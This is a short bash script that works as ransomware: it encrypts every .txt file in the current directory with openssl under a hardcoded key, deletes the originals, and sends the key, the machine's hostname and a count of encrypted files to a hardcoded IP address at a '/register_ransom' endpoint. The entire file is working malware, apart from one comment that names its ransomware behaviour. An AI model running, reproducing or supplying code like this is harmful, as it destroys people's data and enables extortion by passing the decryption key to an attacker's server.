#!/bin/bash
C1="54.95.251.88"
ENCRYPTION_KEY="NadKi31"

for file in *.txt; do
    if [ -f "$file" ]; then
        echo "[!] Encrypting: $file"
        openssl aes-256-cbc -salt -in "$file" -out "$file.encrypted" -k "$ENCRYPTION_KEY" 2>/dev/null
        rm -f "$file"  # Delete original file (typical ransomware behavior)
    fi
done

PWNED=$(hostname)
curl -fsSL -X POST \
    -d "key=$ENCRYPTION_KEY" \
    -d "victim=$PWNED" \
    -d "files_encrypted=$(ls *.encrypted | wc -l)" \
    "http://$C1/register_ransom"